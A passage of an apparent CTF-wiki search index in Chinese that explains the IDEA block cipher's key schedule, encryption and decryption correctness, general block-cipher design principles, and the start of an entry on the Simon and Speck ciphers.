Z_{50}^{-1}=W_{83} J_{13}=Y_3 \\boxplus U3=Y_3\\boxplus Z_{51}^{-1}=W_{82} J_{13}=Y_3 \\boxplus U3=Y_3\\boxplus Z_{51}^{-1}=W_{82} J_{14}=Y_4 \\odot U_4=Y_4 \\odot Z_{52}^{-1}=W_{84} J_{14}=Y_4 \\odot U_4=Y_4 \\odot Z_{52}^{-1}=W_{84} \u53ef\u4ee5\u770b\u51fa\u5f97\u5230\u7684\u7ed3\u679c\u53ea\u6709\u4e2d\u95f4\u7684\u4e24\u4e2a16\u4f4d\u52a0\u5bc6\u7ed3\u679c\u6070\u597d\u76f8\u53cd\u3002\u6211\u4eec\u8fdb\u4e00\u6b65\u770b\u4e00\u4e0b W_{8i} W_{8i} \u662f\u5982\u4f55\u5f97\u5230\u7684\u3002 W_{81}=I_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{81}=I_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{82}=I_{83} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{82}=I_{83} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{83}=I_{82} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{83}=I_{82} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{84}=I_{84} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{84}=I_{84} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) \u90a3\u4e48\u5bf9\u4e8eV11\u6765\u8bf4 V_{11}=J_{11} \\oplus MA_R(J_{11}\\oplus J_{13},J_{12}\\oplus J_{14}) V_{11}=J_{11} \\oplus MA_R(J_{11}\\oplus J_{13},J_{12}\\oplus J_{14}) \u901a\u8fc7\u7b80\u5355\u5e26\u5165\u5df2\u6709\u7684\u503c\uff0c\u663e\u7136 V_{11}=W_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82} \\oplus I_{84})=I_{81} V_{11}=W_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82} \\oplus I_{84})=I_{81} \u5bf9\u4e8e\u5176\u4ed6\u7684\u5143\u7d20\u4e5f\u7c7b\u4f3c\uff0c\u90a3\u4e48\u5176\u5b9e\u6211\u4eec\u4f1a\u53d1\u73b0\u7b2c\u4e00\u8f6e\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u6070\u597d\u662f I_{81},I_{83},I_{82},I_{84} I_{81},I_{83},I_{82},I_{84} \u3002 \u7c7b\u4f3c\u5730\uff0c\u8fd9\u4e2a\u5173\u7cfb\u53ef\u4ee5\u4e00\u76f4\u6ee1\u8db3\u76f4\u5230 V_{81}=I_{11},V_{82}=I_{13},V_{83}=I_{12},V_{84}=I_{14} V_{81}=I_{11},V_{82}=I_{13},V_{83}=I_{12},V_{84}=I_{14} \u90a3\u4e48\u6700\u540e\u518d\u7ecf\u8fc7\u4e00\u6b21\u7b80\u5355\u7684\u8f93\u51fa\u53d8\u6362\uff0c\u6070\u597d\u5f97\u5230\u6700\u521d\u52a0\u5bc6\u7684\u6570\u503c\u3002 \u9898\u76ee \u00b6 2017 HITCON seccomp","title":"IDEA"},{"location":"crypto/blockcipher/idea/#idea","text":"","title":"IDEA"},{"location":"crypto/blockcipher/idea/#_1","text":"\u56fd\u9645\u6570\u636e\u52a0\u5bc6\u7b97\u6cd5 \uff08International Data Encryption Algorithm\uff0cIDEA\uff09\uff0c\u6700\u65e9\u79f0\u4e3a \u6539\u826f\u5efa\u8bae\u52a0\u5bc6\u6807\u51c6 \uff08Improved Proposed Encryption Standard\uff0cIPES\uff09\uff0c\u662f\u5bc6\u7801\u5b66\u4e0a\u4e00\u79cd\u5bf9\u79f0\u5bc6\u94a5\u5206\u7ec4\u5bc6\u7801\uff0c\u7531 James Massey \u4e0e\u6765\u5b66\u5609\u8bbe\u8ba1\uff0c\u57281991\u5e74\u9996\u6b21\u63d0\u51fa\u3002\u8fd9\u4e2a\u7b97\u6cd5\u7684\u63d0\u51fa\uff0c\u662f\u4e3a\u4e86\u53d6\u4ee3\u65e7\u6709\u7684\u6570\u636e\u52a0\u5bc6\u6807\u51c6 DES\u3002\uff08\u6765\u81ea\u7ef4\u57fa\u767e\u79d1\uff09","title":"\u6982\u8ff0"},{"location":"crypto/blockcipher/idea/#_2","text":"","title":"\u57fa\u672c\u6d41\u7a0b"},{"location":"crypto/blockcipher/idea/#_3","text":"IDEA \u5728\u52a0\u5bc6\u7684\u6bcf\u8f6e\u4e2d\u4f7f\u7528 6\u4e2a\u5bc6\u94a5\uff0c\u7136\u540e\u6700\u540e\u8f93\u51fa\u8f6e\u4f7f\u75284\u4e2a\u5bc6\u94a5\u3002\u6240\u4ee5\u4e00\u5171\u670952\u4e2a\u3002 \u524d8\u4e2a\u5bc6\u94a5\u6765\u81ea\u4e0e\u8be5\u7b97\u6cd5\u6700\u521d\u7684\u5bc6\u94a5\uff0cK1 \u53d6\u81ea\u5bc6\u94a5\u7684\u9ad816\u6bd4\u7279\uff0cK8 \u53d6\u81ea\u5bc6\u94a5\u7684\u4f4e16\u6bd4\u7279\u3002 \u5c06\u5bc6\u94a5\u5faa\u73af\u5de6\u79fb 25 \u4f4d\u83b7\u53d6\u4e0b\u4e00\u8f6e\u5bc6\u94a5\uff0c\u7136\u540e\u518d\u6b21\u5206\u4e3a8\u7ec4\u3002","title":"\u5bc6\u94a5\u751f\u6210"},{"location":"crypto/blockcipher/idea/#_4","text":"IDEA \u52a0\u5bc6\u7684\u6570\u636e\u5757\u7684\u5927\u5c0f\u4e3a 64 \u6bd4\u7279\uff0c\u5176\u4f7f\u7528\u7684\u5bc6\u94a5\u957f\u5ea6\u4e3a128 \u6bd4\u7279\u3002\u8be5\u7b97\u6cd5\u4f1a\u5bf9\u8f93\u5165\u7684\u6570\u636e\u5757\u8fdb\u884c8\u6b21\u76f8\u540c\u7684\u53d8\u6362\uff0c\u53ea\u662f\u6bcf\u6b21\u4f7f\u7528\u7684\u5bc6\u94a5\u4e0d\u540c\uff0c\u6700\u540e\u4f1a\u8fdb\u884c\u4e00\u6b21\u8f93\u51fa\u53d8\u6362\u3002\u6bcf\u4e00\u8f6e\u7684\u64cd\u4f5c \u53ef\u4ee5\u8f93\u5165\u548c\u8f93\u51fa\u90fd\u662f 16 \u6bd4\u7279\u4f4d\u4e00\u7ec4\u3002\u6bcf\u4e00\u8f6e\u7684\u4e3b\u8981\u6267\u884c\u7684\u8fd0\u7b97\u6709 \u6309\u4f4d\u5f02\u6216\uff0c\u2295 \u6a21\u52a0\uff0c\u6a21\u6570\u4e3a 2^{16} 2^{16} \uff0c\u229e \u6a21\u4e58\uff0c\u6a21\u6570\u4e3a 2^{16}+1 2^{16}+1 \uff0c\u2299\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f 0x0000 \u7684\u8f93\u5165\u4f1a\u88ab\u4fee\u6539\u4e3a 2^{16} 2^{16} \uff0c 2^{16} 2^{16} \u7684\u8f93\u51fa\u7ed3\u679c\u4f1a\u88ab\u4fee\u6539\u4e3a0x0000\u3002 \u8fd9\u91cc\u6211\u4eec\u79f0\u7531 K5\uff0cK6 \u6784\u6210\u7684\u4e2d\u95f4\u90a3\u4e2a\u65b9\u683c\u7684\u52a0\u5bc6\u65b9\u5f0f\u4e3aMA\u3002\u8fd9\u4e5f\u662f IDEA \u7b97\u6cd5\u4e2d\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u6b64\u5916\uff0c\u6211\u4eec\u79f0 MA_L \u4e3a\u8be5\u90e8\u5206\u52a0\u5bc6\u540e\u7684\u5de6\u4fa7\u7ed3\u679c\uff0c\u5176\u6700\u540e\u4f1a\u548c\u6700\u5de6\u8fb9\u7684 16 \u6bd4\u7279\u64cd\u4f5c\uff1bMA_R \u4e3a\u8be5\u90e8\u5206\u52a0\u5bc6\u540e\u7684\u53f3\u534a\u90e8\u5206\u7684\u7ed3\u679c\uff0c\u5176\u6700\u540e\u4f1a\u548c\u7b2c\u4e09\u4e2a 16 \u6bd4\u7279\u64cd\u4f5c\u3002 \u5728\u6700\u540e\u8f93\u51fa\u8f6e\u7684\u64cd\u4f5c\u5982\u4e0b","title":"\u52a0\u5bc6\u6d41\u7a0b"},{"location":"crypto/blockcipher/idea/#_5","text":"\u89e3\u5bc6\u6d41\u7a0b\u4e0e\u52a0\u5bc6\u6d41\u7a0b\u76f8\u4f3c\uff0c\u4e3b\u8981\u5728\u4e8e\u5176\u5bc6\u94a5\u7684\u9009\u53d6 \u7b2c i(1-9) \u8f6e\u7684\u89e3\u5bc6\u7684\u5bc6\u94a5\u7684\u524d 4 \u4e2a\u5b50\u5bc6\u94a5\u7531\u52a0\u5bc6\u8fc7\u7a0b\u4e2d\u7b2c10-i \u8f6e\u7684\u524d 4 \u4e2a\u5b50\u5bc6\u94a5\u5f97\u51fa \u5176\u4e2d\u7b2c 1 \u4e2a\u548c\u7b2c 4 \u4e2a\u89e3\u5bc6\u5b50\u5bc6\u94a5\u4e3a\u76f8\u5e94\u7684\u5b50\u5bc6\u94a5\u5173\u4e8e 2^{16}+1 2^{16}+1 \u7684\u4e58\u6cd5\u9006\u5143\u3002 \u7b2c 2 \u4e2a\u548c\u7b2c 3 \u4e2a\u5b50\u5bc6\u94a5\u7684\u53d6\u6cd5\u4e3a \u5f53\u8f6e\u6570\u4e3a2\uff0c...\uff0c8\u65f6\uff0c\u53d6\u76f8\u5e94\u7684\u7b2c3\u4e2a\u548c\u7b2c2\u4e2a\u7684\u5b50\u5bc6\u94a5\u7684 2^{16} 2^{16} \u7684\u52a0\u5bc6\u9006\u5143\u3002 \u5f53\u8f6e\u6570\u4e3a 1 \u6216 9 \u65f6\uff0c\u53d6\u76f8\u5e94\u7684\u7b2c 2 \u4e2a\u548c\u7b2c 3 \u4e2a\u5b50\u5bc6\u94a5\u5bf9\u5e94\u7684 2^{16} 2^{16} \u7684\u52a0\u5bc6\u9006\u5143\u3002 \u7b2c 5 \u548c\u7b2c 6 \u4e2a\u5bc6\u94a5\u4e0d\u53d8\u3002","title":"\u89e3\u5bc6\u6d41\u7a0b"},{"location":"crypto/blockcipher/idea/#_6","text":"\u6211\u4eec\u6765\u8bc1\u660e\u4e00\u4e0b\u7b97\u6cd5\u7684\u6b63\u786e\u6027\uff0c\u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u4e8e\u89e3\u5bc6\u7b97\u6cd5\u7684\u7b2c\u4e00\u8f6e\uff0c\u9996\u5148\u6211\u4eec\u5148\u770b\u4e00\u4e0b Y_i Y_i \u662f\u5982\u4f55\u5f97\u5230\u7684 Y_1 = W_{81} \\odot Z_{49} Y_1 = W_{81} \\odot Z_{49} Y_2=W_{83}\\boxplus Z_{50} Y_2=W_{83}\\boxplus Z_{50} Y_3=W_{82}\\boxplus Z_{51} Y_3=W_{82}\\boxplus Z_{51} Y_4=W_{83}\\odot Z_{52} Y_4=W_{83}\\odot Z_{52} \u89e3\u5bc6\u65f6\uff0c\u7b2c\u4e00\u8f6e\u76f4\u63a5\u8fdb\u884c\u7684\u53d8\u6362\u4e3a J_{11}=Y_1 \\odot U_1=Y_1 \\odot Z_{49}^{-1}=W_{81} J_{11}=Y_1 \\odot U_1=Y_1 \\odot Z_{49}^{-1}=W_{81} J_{12}=Y_2 \\boxplus U2=Y_2\\boxplus Z_{50}^{-1}=W_{83} J_{12}=Y_2 \\boxplus U2=Y_2\\boxplus Z_{50}^{-1}=W_{83} J_{13}=Y_3 \\boxplus U3=Y_3\\boxplus Z_{51}^{-1}=W_{82} J_{13}=Y_3 \\boxplus U3=Y_3\\boxplus Z_{51}^{-1}=W_{82} J_{14}=Y_4 \\odot U_4=Y_4 \\odot Z_{52}^{-1}=W_{84} J_{14}=Y_4 \\odot U_4=Y_4 \\odot Z_{52}^{-1}=W_{84} \u53ef\u4ee5\u770b\u51fa\u5f97\u5230\u7684\u7ed3\u679c\u53ea\u6709\u4e2d\u95f4\u7684\u4e24\u4e2a16\u4f4d\u52a0\u5bc6\u7ed3\u679c\u6070\u597d\u76f8\u53cd\u3002\u6211\u4eec\u8fdb\u4e00\u6b65\u770b\u4e00\u4e0b W_{8i} W_{8i} \u662f\u5982\u4f55\u5f97\u5230\u7684\u3002 W_{81}=I_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{81}=I_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{82}=I_{83} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{82}=I_{83} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{83}=I_{82} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{83}=I_{82} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{84}=I_{84} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) W_{84}=I_{84} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84}) \u90a3\u4e48\u5bf9\u4e8eV11\u6765\u8bf4 V_{11}=J_{11} \\oplus MA_R(J_{11}\\oplus J_{13},J_{12}\\oplus J_{14}) V_{11}=J_{11} \\oplus MA_R(J_{11}\\oplus J_{13},J_{12}\\oplus J_{14}) \u901a\u8fc7\u7b80\u5355\u5e26\u5165\u5df2\u6709\u7684\u503c\uff0c\u663e\u7136 V_{11}=W_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82} \\oplus I_{84})=I_{81} V_{11}=W_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82} \\oplus I_{84})=I_{81} \u5bf9\u4e8e\u5176\u4ed6\u7684\u5143\u7d20\u4e5f\u7c7b\u4f3c\uff0c\u90a3\u4e48\u5176\u5b9e\u6211\u4eec\u4f1a\u53d1\u73b0\u7b2c\u4e00\u8f6e\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u6070\u597d\u662f I_{81},I_{83},I_{82},I_{84} I_{81},I_{83},I_{82},I_{84} \u3002 \u7c7b\u4f3c\u5730\uff0c\u8fd9\u4e2a\u5173\u7cfb\u53ef\u4ee5\u4e00\u76f4\u6ee1\u8db3\u76f4\u5230 V_{81}=I_{11},V_{82}=I_{13},V_{83}=I_{12},V_{84}=I_{14} V_{81}=I_{11},V_{82}=I_{13},V_{83}=I_{12},V_{84}=I_{14} \u90a3\u4e48\u6700\u540e\u518d\u7ecf\u8fc7\u4e00\u6b21\u7b80\u5355\u7684\u8f93\u51fa\u53d8\u6362\uff0c\u6070\u597d\u5f97\u5230\u6700\u521d\u52a0\u5bc6\u7684\u6570\u503c\u3002","title":"\u603b\u4f53\u6d41\u7a0b"},{"location":"crypto/blockcipher/idea/#_7","text":"2017 HITCON seccomp","title":"\u9898\u76ee"},{"location":"crypto/blockcipher/introduction/","text":"\u5757\u52a0\u5bc6 \u00b6 \u6982\u8ff0 \u00b6 \u6240\u8c13\u5757\u52a0\u5bc6\u5c31\u662f\u6bcf\u6b21\u52a0\u5bc6\u4e00\u5757\u660e\u6587\uff0c\u5e38\u89c1\u7684\u52a0\u5bc6\u7b97\u6cd5\u6709 IDEA \u52a0\u5bc6 DES \u52a0\u5bc6 AES \u52a0\u5bc6 \u5757\u52a0\u5bc6\u4e5f\u662f\u5bf9\u79f0\u52a0\u5bc6\u3002 \u5176\u5b9e\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u628a\u5757\u52a0\u5bc6\u7406\u89e3\u4e00\u79cd\u7279\u6b8a\u7684\u66ff\u4ee3\u5bc6\u7801\uff0c\u4f46\u662f\u5176\u6bcf\u6b21\u66ff\u4ee3\u7684\u662f\u4e00\u5927\u5757\u3002\u800c\u6b63\u662f\u7531\u4e8e\u4e00\u5927\u5757\uff0c\u660e\u6587\u7a7a\u95f4\u5de8\u5927\uff0c\u800c\u4e14\u5bf9\u4e8e\u4e0d\u540c\u7684\u5bc6\u94a5\uff0c\u6211\u4eec\u65e0\u6cd5\u505a\u4e00\u4e2a\u8868\u8fdb\u884c\u5bf9\u5e94\u76f8\u5e94\u7684\u5bc6\u6587\uff0c\u56e0\u6b64\u5fc5\u987b\u5f97\u6709 \u590d\u6742 \u7684\u52a0\u89e3\u5bc6\u7b97\u6cd5\u6765\u52a0\u89e3\u5bc6\u660e\u5bc6\u6587\u3002 \u800c\u4e0e\u6b64\u540c\u65f6\uff0c\u660e\u6587\u5f80\u5f80\u53ef\u80fd\u5f88\u957f\u4e5f\u53ef\u80fd\u5f88\u77ed\uff0c\u56e0\u6b64\u5728\u5757\u52a0\u5bc6\u65f6\u5f80\u5f80\u9700\u8981\u4e24\u4e2a\u8f85\u52a9 padding\uff0c\u5373 padding \u5230\u6307\u5b9a\u5206\u7ec4\u957f\u5ea6 \u5206\u7ec4\u52a0\u5bc6\u6a21\u5f0f\uff0c\u5373\u660e\u6587\u5206\u7ec4\u52a0\u5bc6\u7684\u65b9\u5f0f\u3002 \u57fa\u672c\u7b56\u7565 \u00b6 \u5728\u5206\u7ec4\u5bc6\u7801\u8bbe\u8ba1\u65f6\uff0c\u5145\u5206\u4f7f\u7528\u4e86 Shannon \u63d0\u51fa\u7684\u4e24\u5927\u7b56\u7565\uff1a\u6df7\u6dc6\u4e0e\u6269\u6563\u4e24\u5927\u7b56\u7565\u3002 \u6df7\u6dc6 \u00b6 \u6df7\u6dc6\uff0cConfusion\uff0c\u5c06\u5bc6\u6587\u4e0e\u5bc6\u94a5\u4e4b\u95f4\u7684\u7edf\u8ba1\u5173\u7cfb\u53d8\u5f97\u5c3d\u53ef\u80fd\u590d\u6742\uff0c\u4f7f\u5f97\u653b\u51fb\u8005\u5373\u4f7f\u83b7\u53d6\u4e86\u5bc6\u6587\u7684\u4e00\u4e9b\u7edf\u8ba1\u7279\u6027\uff0c\u4e5f\u65e0\u6cd5\u63a8\u6d4b\u5bc6\u94a5\u3002\u4e00\u822c\u4f7f\u7528\u590d\u6742\u7684\u975e\u7ebf\u6027\u53d8\u6362\u53ef\u4ee5\u5f97\u5230\u5f88\u597d\u7684\u6df7\u6dc6\u6548\u679c\uff0c\u5e38\u89c1\u7684\u65b9\u6cd5\u5982\u4e0b S \u76d2 \u4e58\u6cd5 \u6269\u6563 \u00b6 \u6269\u6563\uff0cDiffusion\uff0c\u4f7f\u5f97\u660e\u6587\u4e2d\u7684\u6bcf\u4e00\u4f4d\u5f71\u54cd\u5bc6\u6587\u4e2d\u7684\u8bb8\u591a\u4f4d\u3002\u5e38\u89c1\u7684\u65b9\u6cd5\u6709 \u7ebf\u6027\u53d8\u6362 \u7f6e\u6362 \u79fb\u4f4d\uff0c\u5faa\u73af\u79fb\u4f4d \u5e38\u89c1\u52a0\u89e3\u5bc6\u7ed3\u6784 \u00b6 \u76ee\u524d\u5757\u52a0\u5bc6\u4e2d\u4e3b\u8981\u4f7f\u7528\u7684\u662f\u7ed3\u6784\u662f \u8fed\u4ee3\u7ed3\u6784\uff0c\u8fd9\u662f\u56e0\u4e3a\u8fed\u4ee3\u7ed3\u6784\u4fbf\u4e8e\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\uff0c\u540c\u65f6\u65b9\u4fbf\u5b89\u5168\u6027\u8bc4\u4f30\u3002 \u8fed\u4ee3\u7ed3\u6784 \u00b6 \u6982\u8ff0 \u00b6 \u8fed\u4ee3\u7ed3\u6784\u57fa\u672c\u5982\u4e0b\uff0c\u4e00\u822c\u5305\u62ec\u4e09\u4e2a\u90e8\u5206 \u5bc6\u94a5\u7f6e\u6362 \u8f6e\u52a0\u5bc6\u51fd\u6570 \u8f6e\u89e3\u5bc6\u51fd\u6570 \u8f6e\u51fd\u6570 \u00b6 \u76ee\u524d\u6765\u8bf4\uff0c\u8f6e\u51fd\u6570\u4e3b\u8981\u6709\u4e3b\u8981\u6709\u4ee5\u4e0b\u8bbe\u8ba1\u65b9\u6cd5 Feistel Network\uff0c\u7531 Horst Feistel \u53d1\u660e\uff0cDES \u8bbe\u8ba1\u8005\u4e4b\u4e00\u3002 DES Substitution-Permutation Network(SPN) AES \u5176\u4ed6\u65b9\u6848 \u5bc6\u94a5\u6269\u5c55 \u00b6 \u76ee\u524d\uff0c\u5bc6\u94a5\u6269\u5c55\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u6ca1\u6709\u89c1\u5230\u4ec0\u4e48\u5b8c\u7f8e\u7684\u5bc6\u94a5\u6269\u5c55\u65b9\u6cd5\uff0c\u57fa\u672c\u539f\u5219\u662f\u4f7f\u5f97\u5bc6\u94a5\u7684\u6bcf\u4e00\u4e2a\u6bd4\u7279\u5c3d\u53ef\u80fd\u5f71\u54cd\u591a\u8f6e\u7684\u8f6e\u5bc6\u94a5\u3002","title":"\u5757\u52a0\u5bc6"},{"location":"crypto/blockcipher/introduction/#_1","text":"","title":"\u5757\u52a0\u5bc6"},{"location":"crypto/blockcipher/introduction/#_2","text":"\u6240\u8c13\u5757\u52a0\u5bc6\u5c31\u662f\u6bcf\u6b21\u52a0\u5bc6\u4e00\u5757\u660e\u6587\uff0c\u5e38\u89c1\u7684\u52a0\u5bc6\u7b97\u6cd5\u6709 IDEA \u52a0\u5bc6 DES \u52a0\u5bc6 AES \u52a0\u5bc6 \u5757\u52a0\u5bc6\u4e5f\u662f\u5bf9\u79f0\u52a0\u5bc6\u3002 \u5176\u5b9e\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u628a\u5757\u52a0\u5bc6\u7406\u89e3\u4e00\u79cd\u7279\u6b8a\u7684\u66ff\u4ee3\u5bc6\u7801\uff0c\u4f46\u662f\u5176\u6bcf\u6b21\u66ff\u4ee3\u7684\u662f\u4e00\u5927\u5757\u3002\u800c\u6b63\u662f\u7531\u4e8e\u4e00\u5927\u5757\uff0c\u660e\u6587\u7a7a\u95f4\u5de8\u5927\uff0c\u800c\u4e14\u5bf9\u4e8e\u4e0d\u540c\u7684\u5bc6\u94a5\uff0c\u6211\u4eec\u65e0\u6cd5\u505a\u4e00\u4e2a\u8868\u8fdb\u884c\u5bf9\u5e94\u76f8\u5e94\u7684\u5bc6\u6587\uff0c\u56e0\u6b64\u5fc5\u987b\u5f97\u6709 \u590d\u6742 \u7684\u52a0\u89e3\u5bc6\u7b97\u6cd5\u6765\u52a0\u89e3\u5bc6\u660e\u5bc6\u6587\u3002 \u800c\u4e0e\u6b64\u540c\u65f6\uff0c\u660e\u6587\u5f80\u5f80\u53ef\u80fd\u5f88\u957f\u4e5f\u53ef\u80fd\u5f88\u77ed\uff0c\u56e0\u6b64\u5728\u5757\u52a0\u5bc6\u65f6\u5f80\u5f80\u9700\u8981\u4e24\u4e2a\u8f85\u52a9 padding\uff0c\u5373 padding \u5230\u6307\u5b9a\u5206\u7ec4\u957f\u5ea6 \u5206\u7ec4\u52a0\u5bc6\u6a21\u5f0f\uff0c\u5373\u660e\u6587\u5206\u7ec4\u52a0\u5bc6\u7684\u65b9\u5f0f\u3002","title":"\u6982\u8ff0"},{"location":"crypto/blockcipher/introduction/#_3","text":"\u5728\u5206\u7ec4\u5bc6\u7801\u8bbe\u8ba1\u65f6\uff0c\u5145\u5206\u4f7f\u7528\u4e86 Shannon \u63d0\u51fa\u7684\u4e24\u5927\u7b56\u7565\uff1a\u6df7\u6dc6\u4e0e\u6269\u6563\u4e24\u5927\u7b56\u7565\u3002","title":"\u57fa\u672c\u7b56\u7565"},{"location":"crypto/blockcipher/introduction/#_4","text":"\u6df7\u6dc6\uff0cConfusion\uff0c\u5c06\u5bc6\u6587\u4e0e\u5bc6\u94a5\u4e4b\u95f4\u7684\u7edf\u8ba1\u5173\u7cfb\u53d8\u5f97\u5c3d\u53ef\u80fd\u590d\u6742\uff0c\u4f7f\u5f97\u653b\u51fb\u8005\u5373\u4f7f\u83b7\u53d6\u4e86\u5bc6\u6587\u7684\u4e00\u4e9b\u7edf\u8ba1\u7279\u6027\uff0c\u4e5f\u65e0\u6cd5\u63a8\u6d4b\u5bc6\u94a5\u3002\u4e00\u822c\u4f7f\u7528\u590d\u6742\u7684\u975e\u7ebf\u6027\u53d8\u6362\u53ef\u4ee5\u5f97\u5230\u5f88\u597d\u7684\u6df7\u6dc6\u6548\u679c\uff0c\u5e38\u89c1\u7684\u65b9\u6cd5\u5982\u4e0b S \u76d2 \u4e58\u6cd5","title":"\u6df7\u6dc6"},{"location":"crypto/blockcipher/introduction/#_5","text":"\u6269\u6563\uff0cDiffusion\uff0c\u4f7f\u5f97\u660e\u6587\u4e2d\u7684\u6bcf\u4e00\u4f4d\u5f71\u54cd\u5bc6\u6587\u4e2d\u7684\u8bb8\u591a\u4f4d\u3002\u5e38\u89c1\u7684\u65b9\u6cd5\u6709 \u7ebf\u6027\u53d8\u6362 \u7f6e\u6362 \u79fb\u4f4d\uff0c\u5faa\u73af\u79fb\u4f4d","title":"\u6269\u6563"},{"location":"crypto/blockcipher/introduction/#_6","text":"\u76ee\u524d\u5757\u52a0\u5bc6\u4e2d\u4e3b\u8981\u4f7f\u7528\u7684\u662f\u7ed3\u6784\u662f \u8fed\u4ee3\u7ed3\u6784\uff0c\u8fd9\u662f\u56e0\u4e3a\u8fed\u4ee3\u7ed3\u6784\u4fbf\u4e8e\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\uff0c\u540c\u65f6\u65b9\u4fbf\u5b89\u5168\u6027\u8bc4\u4f30\u3002","title":"\u5e38\u89c1\u52a0\u89e3\u5bc6\u7ed3\u6784"},{"location":"crypto/blockcipher/introduction/#_7","text":"","title":"\u8fed\u4ee3\u7ed3\u6784"},{"location":"crypto/blockcipher/introduction/#_8","text":"\u8fed\u4ee3\u7ed3\u6784\u57fa\u672c\u5982\u4e0b\uff0c\u4e00\u822c\u5305\u62ec\u4e09\u4e2a\u90e8\u5206 \u5bc6\u94a5\u7f6e\u6362 \u8f6e\u52a0\u5bc6\u51fd\u6570 \u8f6e\u89e3\u5bc6\u51fd\u6570","title":"\u6982\u8ff0"},{"location":"crypto/blockcipher/introduction/#_9","text":"\u76ee\u524d\u6765\u8bf4\uff0c\u8f6e\u51fd\u6570\u4e3b\u8981\u6709\u4e3b\u8981\u6709\u4ee5\u4e0b\u8bbe\u8ba1\u65b9\u6cd5 Feistel Network\uff0c\u7531 Horst Feistel \u53d1\u660e\uff0cDES \u8bbe\u8ba1\u8005\u4e4b\u4e00\u3002 DES Substitution-Permutation Network(SPN) AES \u5176\u4ed6\u65b9\u6848","title":"\u8f6e\u51fd\u6570"},{"location":"crypto/blockcipher/introduction/#_10","text":"\u76ee\u524d\uff0c\u5bc6\u94a5\u6269\u5c55\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u6ca1\u6709\u89c1\u5230\u4ec0\u4e48\u5b8c\u7f8e\u7684\u5bc6\u94a5\u6269\u5c55\u65b9\u6cd5\uff0c\u57fa\u672c\u539f\u5219\u662f\u4f7f\u5f97\u5bc6\u94a5\u7684\u6bcf\u4e00\u4e2a\u6bd4\u7279\u5c3d\u53ef\u80fd\u5f71\u54cd\u591a\u8f6e\u7684\u8f6e\u5bc6\u94a5\u3002","title":"\u5bc6\u94a5\u6269\u5c55"},{"location":"crypto/blockcipher/simon-speck/","text":"Simon and Speck Block Ciphers \u00b6 \u8fd9\u662f\u4e00\u7ec4\u59d0\u59b9\u8f7b\u91cf\u7ea7\u52a0\u5bc6\u3002 Simon Block Cipher \u00b6 \u57fa\u672c\u4ecb\u7ecd \u00b6 Simon \u5757\u52a0\u5bc6\u7b97\u6cd5\u7531 NSA 2013 \u5e74 6 \u6708\u516c\u5e03\uff0c\u4e3b\u8981\u5728 \u786c\u4ef6\u5b9e\u73b0 \u4e0a\u8fdb\u884c\u4e86\u4f18\u5316\u3002 Simon Block Cipher \u662f\u5e73\u8861\u7684 Feistel cipher \u52a0\u5bc6\uff0c\u4e00\u5171\u6709\u4e24\u5757\uff0c\u82e5\u6bcf\u5757\u52a0\u5bc6\u7684\u5927\u5c0f\u4e3a n bits\uff0c\u90a3\u4e48\u660e\u6587\u7684\u5927\u5c0f\u5c31\u662f 2n bits\u3002\u6b64\u5916\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u52a0\u5bc6\u4e2d\u6240\u4f7f\u7528\u7684\u5bc6\u94a5\u957f\u5ea6\u662f\u5757\u957f\u5ea6\u7684\u6574\u6570\u500d\uff0c\u6bd4\u5982 2n\uff0c4n\u7b49\u3002\u5e38\u89c1\u7684 Simon \u52a0\u5bc6\u7b97\u6cd5\u6709 \u4e00\u822c\u6765\u8bf4\uff0cSimon \u7b97\u6cd5\u79f0\u4e4b\u4e3a Simon 2 n /nm\uff0cn \u4e3a\u5757\u5927\u5c0f\uff0cm \u662f\u5757\u5927\u5c0f\u4e0e\u5bc6\u94a5\u4e4b\u95f4\u7684\u500d\u6570\u3002\u6bd4\u5982\u8bf4 Simon 48/96 \u5c31\u662f\u6307\u660e\u6587\u662f 48 \u6bd4\u7279\uff0c\u5bc6\u94a5\u662f 96 \u6bd4\u7279\u7684\u52a0\u5bc6\u7b97\u6cd5\u3002 \u6b64\u5916\uff0c\u5bf9\u4e8e Simon \u5757\u52a0\u5bc6\u7b97\u6cd5\u6765\u8bf4\uff0c\u6bcf\u8f6e\u7684\u52a0\u5bc6\u8fc7\u7a0b\u4e00\u6837\uff0c\u5982\u4e0b \u5f53\u7136\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u8f6e\u4ee5\u53ca\u4e0d\u540c\u7684 m 